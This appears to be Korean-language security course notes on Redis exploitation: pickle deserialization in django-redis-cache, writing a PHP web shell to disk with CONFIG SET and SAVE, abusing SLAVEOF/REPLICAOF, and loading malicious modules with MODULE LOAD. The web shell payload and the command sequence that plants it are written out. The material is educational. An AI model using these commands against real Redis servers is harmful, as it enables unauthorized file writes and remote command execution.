Redis Exploit Technique :
    Redis 공격을 통해 얻을 수 있는 정보로는 가장 먼저 Redis에 저장되어 있는 정보입니다. 
    어플리케이션의 로직에 따라 주요한 정보가 포함되어 있을 수 있습니다.

    그리고 Redis에 저장된 정보를 기반으로 로직을 실행하는 다른 어플리케이션을 이용하거나, Redis 자체의 명령어를 이용한 공격 방법들이 있습니다.

1) django-redis-cache :
    Python 에서 많이 사용되는 웹 프레임워크 중 하나인 Django 에서 Redis를 사용한 cache를 구현할 수 있는 모듈입니다.

    아래 코드는 django-redis-cache 모듈을 사용한 예시 코드입니다.
    ex)
        # settings.py
        CACHES = {
            "default": {
                "BACKEND": "django_redis.cache.RedisCache",
                "LOCATION": "redis://127.0.0.1:6379/"
            }
        }
        
        # views.py
        from django.http import HttpResponse
        from .models import Memo
        from django.core.cache import cache
        
        def p_set(request):
            cache.set('cache_memo', Memo('memo test!!'))
            return HttpResponse('set seesion')

    p_set 함수가 실행되면 Redis에 cache_memo 라는 키가 생성됩니다.
    ex)
        $ redis-cli
        127.0.0.1:6379> keys *
        1) ":1:cache_memo"

    cache_memo 값을 확인해보면 Pickle로 dump된 값을 확인할 수 있습니다.
    ex)
        127.0.0.1:6379> get ":1:cache_memo"
        "\x80\x04\x95\x97\x00\x00\x00\x00\x00\x00\x00\x8c\x15django.db.models.base\
        x94\x8c\x0emodel_unpickle\x94\x93\x94\x8c\x02dt\x94\x8c\x04Memo\x94\x86\x94\
        x85\x94R\x94}\x94(\x8c\x06_state\x94h\x00\x8c\nModelState\x94\x93\x94)\x81\x94\
        x8c\x02id\x94\x8c\x0bmemo test!!\x94\x8c\x04data\x94\x8c\x00\x94\x8c\
        x0f_django_version\x94\x8c\x053.0.6\x94ub."

    django-redis-cache 모듈의 코드를 보면 get_serializer_class 함수에서 serializer_class를 가져올 때
    options의 SERIALIZER_CLASS 값을 가져오고 값이 없으면 redis_cache.serializers.PickleSerializer Class를 기본 값으로 사용합니다.
    ex)
        # https://github.com/sebleier/django-redis-cache/blob/cabfcb24476e562fa7275f77bc55f835d125e26c/redis_cache/backends/base.py#L132-L137
            
            def get_serializer_class(self):
                serializer_class = self.options.get(
                    'SERIALIZER_CLASS',
                    'redis_cache.serializers.PickleSerializer'
                )
                
                return import_class(serializer_class)
        # https://github.com/sebleier/django-redis-cache/blob/cabfcb24476e562fa7275f77bc55f835d125e26c/redis_cache/serializers.py#L33-L42
        
        class PickleSerializer(object):
            
            def __init__(self, pickle_version=-1):
                self.pickle_version = pickle_version
            
            def serialize(self, value):
                return pickle.dumps(value, self.pickle_version)
            
            def deserialize(self, value):
                return pickle.loads(force_bytes(value))

    Server-side basic - Language specific Vulnerability 에서 다룬 내용처럼 serialize를 할 때 Python의 pickle 모듈을 사용할 경우 공격에 사용될 수 있습니다.
    
    django-redis-cache의 기본 Serializer인 PickleSerializer에서 pickle 모듈을 사용하기 때문에, 
    Redis에 원하는 데이터 저장한 후 해당 데이터가 deserialize하게 되는 과정에서 pickle 모듈을 이용하여 공격을 수행할 수 있습니다.

2) Redis 명령어 (SAVE) :
    Redis는 기본적으로 메모리에 데이터를 저장 및 조회하는 인메모리 데이터베이스입니다.
    하지만 데이터 손실 방지등의 이유로 지정된 일정 시간마다 메모리의 데이터를 파일 시스템에 저장합니다.

    또한 Redis의 명령어를 통해 해당 파일을 저장하는 주기를 변경 또는 즉시 저장하게 할 수 있으며, 
    저장되는 파일의 경로, 파일 이름 및 저장될 데이터를 설정 할 수 있습니다.
    ex)
        CONFIG set dir /tmp // 저장될 파일 경로 설정
        CONFIG set dbfilename redis.php // 파일 이름 설정
        SET test "<?php system($_GET['cmd']); ?>" // 데이터 추가
        SAVE // 파일 시스템 저장

    위와 같은 명령어를 통해 Redis의 쓰기 권한이 있는 경로에 파일을 생성할 수 있습니다.
    ex)
        $ ls -al redis.php 
        -rw-rw---- 1 redis redis 57 May 17 16:59 redis.php
        $ xxd redis.php 
        00000000: 5245 4449 5330 3030 36fe 0000 0474 6573  REDIS0006....tes
        00000010: 741e 3c3f 7068 7020 7379 7374 656d 2824  t.<?php system($
        00000020: 5f47 4554 5b27 636d 6427 5d29 3b20 3f3e  _GET['cmd']); ?>
        00000030: ffef 0fe2 9f24 c9b8 a3                   .....$...

    위와 같이 파일 시스템에 원하는 파일을 생성한 후, PHP 등의 다른 어플리케이션과 연계하여 공격을 수행할 수 있습니다.

3) Redis 명령어 (SLAVEOF / REPLICAOF) :
    다른 Redis 노드를 명령어를 실행하는 노드의 마스터 노드로 지정할 수 있습니다.
    마스터 노드와 성공적으로 연결이 완료되면, 마스터 노드의 데이터를 복제하여 저장합니다.
    ex)
        SLAVEOF|REPLICAOF host port // 마스터 노드 지정
        SLAVEOF|REPLICAOF No one // 마스터 노드 지정 해제

        현대 사회에서 IT 분아랴고 하더라도 Slave라는 용어의 사용은 부적절합니다. 
        Redis 5.0 버전부터는 SLAVEOF를 대체하는 REPLICAOF로 변경되었습니다. 
        (SLAVEOF 명령어는 이전 버전과의 호환성 문제로 인해 명령어 자체는 동작합니다.)
        https://redis.io/commands/slaveof

    해당 명령어가 성공적으로 실행되기 위해서는 마스터 노드에 연결을 맺는 과정이 포함되는데, 
    이 때 발생하는 네트워크 트래픽을 통해 Redis 공격이 성공적으로 수행되었다는 점을 원격으로 확인해 볼 수도 있습니다.
    ex)
        SLAVEOF 127.0.0.1 8888

    위와 같이 원하는 주소와 포트를 입력 시 아래와 같이 노드의 상태를 확인하기 위한 데이터가 수신되는 것을 확인할 수 있습니다.
    ex)
        $ nc -l 8888 -kv
        Listening on [0.0.0.0] (family 0, port 8888)
        Connection from [127.0.0.1] port 8888 [tcp/*] accepted (family 2, sport 52613)
        PING

    또한 마스터 노드의 데이터를 가져오기 위한 Sync과정의 RDB 데이터를 임의의 데이터로 조작해 원하는 파일을 업로드하는 공격 방식도 존재합니다.

3) Redis 명령어 (MODULE LOAD) :
    Redis 4.0 버전 부터는 Module Load 명령어를 통해 새로운 라이브러리를 추가해 사용할 수 있습니다.

    RedisModuleSDK(https://github.com/RedisLabs/RedisModulesSDK)를 기반으로 공유 라이브러리를 제작해 파일 업로드
    또는 Sync과정을 조작하여 임의의 데이터를 업로드하는 등의 로직을 통해 해당 Redis 파일 시스템에 업로드한 후
    MODULE LOAD를 통해 해당 라이브러리를 로드할 수 있습니다.
    ex)
        //https://github.com/RedisLabs/RedisModulesSDK/blob/e756dd897fd08ac7eb8f3eb611c2cd4b591183c3/example/module.c
        
        // Unit test entry point for the module
        int TestModule(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
            RedisModule_AutoMemory(ctx);
            
            RMUtil_Test(testParse);
            RMUtil_Test(testHgetSet);
            
            RedisModule_ReplyWithSimpleString(ctx, "PASS");
            return REDISMODULE_OK;
        }
        
        int RedisModule_OnLoad(RedisModuleCtx *ctx) {
        
        ...
            // register the unit test
            RMUtil_RegisterWriteCmd(ctx, "example.test", TestModule);
            
            return REDISMODULE_OK;
        }

    위와 같이 제작된 Redis Module을 컴파일 한 후, 아래와 같이 Redis가 접근할 수 있는 디렉토리에 모듈이 존재할 경우 해당 모듈을 로드하여 사용할 수 있습니다.
    ex)
        $ redis-cli
        127.0.0.1:6379> module load /var/lib/redis/module.so
        OK
        127.0.0.1:6379> module list
        1)  1) "name"
            2) "example"
            3) "ver"
            4) (integer) 1
        127.0.0.1:6379> EXAMPLE.TEST
        PASS

    Redis Module에 system 함수와 같이 OS명령어를 실행하는 함수 또는 원하는 파일 시스템에 접근 할 수 있는 함수등을 포함 시켜 공격에 사용할 수 있습니다.
























